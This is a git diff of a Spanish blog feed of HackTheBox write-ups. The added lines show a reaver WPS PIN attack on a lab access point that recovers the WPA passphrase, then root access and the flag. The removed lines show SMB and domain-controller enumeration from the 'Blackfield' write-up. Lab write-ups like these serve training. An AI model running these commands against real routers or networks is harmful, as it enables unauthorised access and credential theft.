+		<span class="nb">type </span>P2P-device
+		txpower 20.00 dBm
+	Interface wlan1
+		ifindex 4
+		wdev 0x100000001
+		addr 02:00:00:00:01:00
+		ssid OpenWrt
+		<span class="nb">type </span>managed
+		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
+		txpower 20.00 dBm
+phy#0
+	Interface wlan0
+		ifindex 3
+		wdev 0x1
+		addr 02:00:00:00:00:00
+		ssid OpenWrt
+		<span class="nb">type </span>AP
+		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
+		txpower 20.00 dBm
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vemos que wlan0 tiene como nombre su <code class="language-plaintext highlighter-rouge">AP</code> <code class="language-plaintext highlighter-rouge">OpenWRT</code> que opera en el canal 1.</p>
+  </li>
+  <li>
+    <p>Este es mas interesante ya que esta corriendo en modo <code class="language-plaintext highlighter-rouge">managed</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phy#1
+	Unnamed/non-netdev interface
+		wdev 0x10000056b
+		addr 42:00:00:00:01:00
+		<span class="nb">type </span>P2P-device
+		txpower 20.00 dBm
+	Interface wlan1
+		ifindex 4
+		wdev 0x100000001
+		addr 02:00:00:00:01:00
+		ssid OpenWrt
+		<span class="nb">type </span>managed
+		channel 1 <span class="o">(</span>2412 MHz<span class="o">)</span>, width: 20 MHz <span class="o">(</span>no HT<span class="o">)</span>, center1: 2412 MHz
+		txpower 20.00 dBm
+</code></pre></div></div>
+
+<blockquote>
+  <p>type managed: La interfaz está en modo “managed”, también conocido como modo “infraestructura”. Este modo es utilizado en dispositivos clientes que se conectan a un punto de acceso central (como un router). El dispositivo en este modo se comunica a través de un punto de acceso.</p>
+</blockquote>
+
+<blockquote>
+  <p>El “modo managed” es un tipo de configuración de red inalámbrica en la que la interfaz inalámbrica del dispositivo opera como un cliente dentro de una infraestructura de red WLAN más grande. Este es el modo típico utilizado por los dispositivos que se conectan a un router Wi-Fi. En este modo, todas las decisiones sobre cuándo y cómo transmitir datos a través de la red son administradas por el punto de acceso, y no por la interfaz inalámbrica del cliente.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Como nos mencionan la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> cuando vimos las <code class="language-plaintext highlighter-rouge">capabilities</code> si investigamos la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> pues es un <code class="language-plaintext highlighter-rouge">WPS cracker</code>.</p>
+  </li>
+  <li>
+    <p>Aquí nos explican sobre el PIN <a href="https://outpost24.com/blog/wps-cracking-with-reaver/">https://outpost24.com/blog/wps-cracking-with-reaver/</a>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/wifinetic/5.png" />
+</p>
+
+<blockquote>
+  <p>El PIN de WPS, generalmente de 8 dígitos, está impreso en el dispositivo para facilitar el acceso. Los primeros 7 dígitos son aleatorios y el último dígito es un dígito de verificación o checksum, calculado en base a los otros dígitos para detectar errores de entrada.</p>
+</blockquote>
+
+<blockquote>
+  <p>Durante el proceso de autenticación, el sistema verifica el PIN en dos etapas. Primero, verifica los primeros cuatro dígitos del PIN. Si esta primera parte es correcta, procede a verificar los siguientes tres dígitos (el octavo es el dígito de checksum).</p>
+</blockquote>
+
+<ul>
+  <li>Para eso usaremos <code class="language-plaintext highlighter-rouge">Reaver</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
+
+Required Arguments:
+	<span class="nt">-i</span>, <span class="nt">--interface</span><span class="o">=</span>&lt;wlan&gt;          Name of the monitor-mode interface to use
+	<span class="nt">-b</span>, <span class="nt">--bssid</span><span class="o">=</span>&lt;mac&gt;               BSSID of the target AP
+
+Optional Arguments:
+	<span class="nt">-m</span>, <span class="nt">--mac</span><span class="o">=</span>&lt;mac&gt;                 MAC of the host system
+	<span class="nt">-e</span>, <span class="nt">--essid</span><span class="o">=</span>&lt;ssid&gt;              ESSID of the target AP
+	<span class="nt">-c</span>, <span class="nt">--channel</span><span class="o">=</span>&lt;channel&gt;         Set the 802.11 channel <span class="k">for </span>the interface <span class="o">(</span>implies <span class="nt">-f</span><span class="o">)</span>
+	<span class="nt">-s</span>, <span class="nt">--session</span><span class="o">=</span>&lt;file&gt;            Restore a previous session file
+	<span class="nt">-C</span>, <span class="nt">--exec</span><span class="o">=</span>&lt;<span class="nb">command</span><span class="o">&gt;</span>            Execute the supplied <span class="nb">command </span>upon successful pin recovery
+	<span class="nt">-f</span>, <span class="nt">--fixed</span>                     Disable channel hopping
+	<span class="nt">-5</span>, <span class="nt">--5ghz</span>                      Use 5GHz 802.11 channels
+	<span class="nt">-v</span>, <span class="nt">--verbose</span>                   Display non-critical warnings <span class="o">(</span><span class="nt">-vv</span> or <span class="nt">-vvv</span> <span class="k">for </span>more<span class="o">)</span>
+	<span class="nt">-q</span>, <span class="nt">--quiet</span>                     Only display critical messages
+	<span class="nt">-h</span>, <span class="nt">--help</span>                      Show <span class="nb">help
+
+</span>Advanced Options:
+	<span class="nt">-p</span>, <span class="nt">--pin</span><span class="o">=</span>&lt;wps pin&gt;             Use the specified pin <span class="o">(</span>may be arbitrary string or 4/8 digit WPS pin<span class="o">)</span>
+	<span class="nt">-d</span>, <span class="nt">--delay</span><span class="o">=</span>&lt;seconds&gt;           Set the delay between pin attempts <span class="o">[</span>1]
+	<span class="nt">-l</span>, <span class="nt">--lock-delay</span><span class="o">=</span>&lt;seconds&gt;      Set the <span class="nb">time </span>to <span class="nb">wait </span><span class="k">if </span>the AP locks WPS pin attempts <span class="o">[</span>60]
+	<span class="nt">-g</span>, <span class="nt">--max-attempts</span><span class="o">=</span>&lt;num&gt;        Quit after num pin attempts
+	<span class="nt">-x</span>, <span class="nt">--fail-wait</span><span class="o">=</span>&lt;seconds&gt;       Set the <span class="nb">time </span>to <span class="nb">sleep </span>after 10 unexpected failures <span class="o">[</span>0]
+	<span class="nt">-r</span>, <span class="nt">--recurring-delay</span><span class="o">=</span>&lt;x:y&gt;     Sleep <span class="k">for </span>y seconds every x pin attempts
+	<span class="nt">-t</span>, <span class="nt">--timeout</span><span class="o">=</span>&lt;seconds&gt;         Set the receive <span class="nb">timeout </span>period <span class="o">[</span>10]
+	<span class="nt">-T</span>, <span class="nt">--m57-timeout</span><span class="o">=</span>&lt;seconds&gt;     Set the M5/M7 <span class="nb">timeout </span>period <span class="o">[</span>0.40]
+	<span class="nt">-A</span>, <span class="nt">--no-associate</span>              Do not associate with the AP <span class="o">(</span>association must be <span class="k">done </span>by another application<span class="o">)</span>
+	<span class="nt">-N</span>, <span class="nt">--no-nacks</span>                  Do not send NACK messages when out of order packets are received
+	<span class="nt">-S</span>, <span class="nt">--dh-small</span>                  Use small DH keys to improve crack speed
+	<span class="nt">-L</span>, <span class="nt">--ignore-locks</span>              Ignore locked state reported by the target AP
+	<span class="nt">-E</span>, <span class="nt">--eap-terminate</span>             Terminate each WPS session with an EAP FAIL packet
+	<span class="nt">-J</span>, <span class="nt">--timeout-is-nack</span>           Treat <span class="nb">timeout </span>as NACK <span class="o">(</span>DIR-300/320<span class="o">)</span>
+	<span class="nt">-F</span>, <span class="nt">--ignore-fcs</span>                Ignore frame checksum errors
+	<span class="nt">-w</span>, <span class="nt">--win7</span>                      Mimic a Windows 7 registrar <span class="o">[</span>False]
+	<span class="nt">-K</span>, <span class="nt">--pixie-dust</span>                Run pixiedust attack
+	<span class="nt">-Z</span>                              Run pixiedust attack
+
+Example:
+	reaver <span class="nt">-i</span> wlan0mon <span class="nt">-b</span> 00:90:4C:C1:AC:21 <span class="nt">-vv</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Para usarla simplemente le necesitas proporcionar el nombre de la interfaz en modo monitor y la <code class="language-plaintext highlighter-rouge">MAC</code> del <code class="language-plaintext highlighter-rouge">target</code>.</p>
+  </li>
+  <li>
+    <p>Vamos atacar el target donde se esta corriendo el <strong>AP</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver <span class="nt">-i</span> mon0 <span class="nt">-b</span> 02:00:00:00:00:00 <span class="nt">-vv</span>
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
+
+<span class="o">[</span>+] Waiting <span class="k">for </span>beacon from 02:00:00:00:00:00
+<span class="o">[</span>+] Switching mon0 to channel 1
+<span class="o">[</span>+] Received beacon from 02:00:00:00:00:00
+<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
+<span class="o">[</span>+] Sending authentication request
+<span class="o">[!]</span> Found packet with bad FCS, skipping...
+<span class="o">[</span>+] Sending association request
+<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
+<span class="o">[</span>+] Sending EAPOL START request
+<span class="o">[</span>+] Received identity request
+<span class="o">[</span>+] Sending identity response
+<span class="o">[</span>+] Received M1 message
+<span class="o">[</span>+] Sending M2 message
+<span class="o">[</span>+] Received WSC NACK
+<span class="o">[</span>+] Sending WSC NACK
+<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
+<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
+<span class="o">[</span>+] Sending authentication request
+<span class="o">[</span>+] Sending association request
+<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
+<span class="o">[</span>+] Sending EAPOL START request
+<span class="o">[</span>+] Received identity request
+<span class="o">[</span>+] Sending identity response
+<span class="o">[</span>+] Received M1 message
+<span class="o">[</span>+] Sending M2 message
+<span class="o">[</span>+] Received WSC NACK
+<span class="o">[</span>+] Sending WSC NACK
+<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
+<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
+<span class="o">[</span>+] Sending authentication request
+<span class="o">[</span>+] Sending association request
+<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
+<span class="o">[</span>+] Sending EAPOL START request
+<span class="o">[</span>+] Received identity request
+<span class="o">[</span>+] Sending identity response
+<span class="o">[</span>+] Received M1 message
+<span class="o">[</span>+] Sending M2 message
+<span class="o">[</span>+] Received WSC NACK
+<span class="o">[</span>+] Sending WSC NACK
+<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
+<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
+<span class="o">[</span>+] Sending authentication request
+<span class="o">[</span>+] Sending association request
+<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
+<span class="o">[</span>+] Sending EAPOL START request
+<span class="o">[</span>+] Received identity request
+<span class="o">[</span>+] Sending identity response
+<span class="o">[</span>+] Received M1 message
+<span class="o">[</span>+] Sending M2 message
+<span class="o">[</span>+] Received M3 message
+<span class="o">[</span>+] Sending M4 message
+<span class="o">[</span>+] Received M5 message
+<span class="o">[</span>+] Sending M6 message
+<span class="o">[</span>+] Received M7 message
+<span class="o">[</span>+] Sending WSC NACK
+<span class="o">[</span>+] Sending WSC NACK
+<span class="o">[</span>+] Pin cracked <span class="k">in </span>6 seconds
+<span class="o">[</span>+] WPS PIN: <span class="s1">'12345670'</span>
+<span class="o">[</span>+] WPA PSK: <span class="s1">'WhatIsRealAnDWhAtIsNot51121!'</span>
+<span class="o">[</span>+] AP SSID: <span class="s1">'OpenWrt'</span>
+<span class="o">[</span>+] Nothing <span class="k">done</span>, nothing to save.
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que tenemos el <code class="language-plaintext highlighter-rouge">PIN</code> y la <code class="language-plaintext highlighter-rouge">Password</code>.</li>
+</ul>
+
+<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>
+
+<ul>
+  <li>Si migramos al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>su root
+Password:
+root@wifinetic:/# <span class="nb">whoami
+</span>root
+root@wifinetic:/#
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@wifinetic:~# <span class="nb">cat </span>root.txt
+82e27401ce5bb1d85196562913c72da9
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Inject (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" rel="alternate" type="text/html" title="HackTheBox - Inject (easy)" /><published>2024-06-02T00:00:00-06:00</published><updated>2024-06-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png" />
 </p>
 
@@ -8752,2134 +9531,4 @@ C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;wh
 </span>nt authority<span class="se">\s</span>ystem
 
 C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt;
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Blackfield (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield.html" rel="alternate" type="text/html" title="HackTheBox - Blackfield (hard)" /><published>2024-04-20T00:00:00-06:00</published><updated>2024-04-20T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/04/20/blackfield.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png" />
-</p>
-
-<ul>
-  <li>En este post vamos a estar haciendo la maquina Blackfield de la plataforma de Hack The Box donde vamos a estar enumerando por SMB, estar usando kerbrute para validar usuarios del dominio y poder hacer un ASRepRoast Attack además de que enumerando con Bloodhound encontramos que podemos cambiarle la contraseña a un usuario usando net rpc y nos conectaremos con evil-winrm ala maquina para la escalada de privilegios abusaremos de un privilegio que tenemos que es el SeBackupPrivilege para hacer una copia de 2 archivos y usar secretsdump para ver los hashes de los usuarios y conectarnos como el administrador.</li>
-</ul>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos escaneando los servicios que corre la maquina victima en sus puertos abiertos por el protocolo <strong>TCP</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,389,445,593,3268,5985 10.129.126.69 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-19 19:05 CST
-Nmap scan report <span class="k">for </span>10.129.126.69
-Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT     STATE SERVICE       VERSION
-53/tcp   open  domain        Simple DNS Plus
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-20 08:05:47Z<span class="o">)</span>
-135/tcp  open  msrpc         Microsoft Windows RPC
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
-445/tcp  open  microsoft-ds?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode:
-|   3:1:1:
-|_    Message signing enabled and required
-| smb2-time:
-|   <span class="nb">date</span>: 2024-04-20T08:05:53
-|_  start_date: N/A
-|_clock-skew: 6h59m59s
-</code></pre></div></div>
-
-<h2 id="enumeración">Enumeración</h2>
-
-<ul>
-  <li>Estamos ante un DC.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.126.69
-SMB         10.129.126.69   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a ver si hay recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	NO ACCESS	Forensic / Audit share.
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	NO ACCESS	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	SYSVOL                                            	NO ACCESS	Logon server share
-</code></pre></div></div>
-
-<ul>
-  <li>Tenemos privilegio de lectura en <code class="language-plaintext highlighter-rouge">profiles$</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-r</span> <span class="s1">'profiles$'</span> <span class="nt">--no-banner</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	forensic                                          	NO ACCESS	Forensic / Audit share.
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	NETLOGON                                          	NO ACCESS	Logon server share
-	profiles<span class="nv">$ </span>                                        	READ ONLY	
-	./profiles<span class="err">$</span>
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	<span class="nb">.</span>
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AAlleni
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABarteski
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABekesz
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABenzies
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABiemiller
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AChampken
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACheretei
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACsonaki
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AHigchens
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AJaquemai
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKlado
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKoffenburger
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKollolli
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKruppe
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKubale
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ALamerz
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMaceldon
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMasalunga
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANavay
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANesterova
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANeusse
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AOkleshen
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	APustulka
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ARotella
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASanwardeker
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AShadaia
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASischo
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASpruce
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATakach
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATaueg
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATwardowski
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	audit2020
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWangenheim
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWorsey
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AZigmunt
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBakajza
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBeloucif
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BCarmitcheal
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BConsultant
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BErdossy
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BGeminski
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BLostal
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BMannise
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BNovrotsky
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BRigiero
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BSamkoses
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BZandonella
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAcherman
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAkbari
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAldhowaihi
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CArgyropolous
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CDufrasne
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CGronk
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	Chiucarello
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Chiuccariello
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CHoytal
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKijauskas
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKolbo
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMakutenas
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMorcillo
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSchandall
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSelters
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CTolmie
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCecere
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DChintalapalli
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCwilich
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DGarbatiuc
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DKemesies
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMatuka
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMedeme
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMeherek
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMetych
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPaskalev
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPriporov
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DRusanovskaya
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVellela
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVogleson
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DZwinak
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EBoley
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EEulau
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFeatherling
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFrixione
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EJenorik
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EKmilanovic
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ElKatkowsky
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EmaCaratenuto
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPalislamovic
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPryar
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESachhitello
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESariotti
-	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ETurgano
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EWojtila
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FAlirezai
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBaldwind
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBroj
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDeblaquire
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDegeorgio
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FianLaginja
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FLasokowski
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FPflum
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FReffey
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GaBelithe
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Gareld
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GBatowski
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GForshalger
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GGomane
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GHisek
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMaroufkhani
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMerewether
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GQuinniey
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GRoswurm
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GWiegard
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HBlaziewske
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HColantino
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HConforto
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HCunnally
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HGougen
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HKostova
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IChristijr
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKoledo
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKotecky
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ISantosi
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JAngvall
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JBehmoiras
-	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDanten
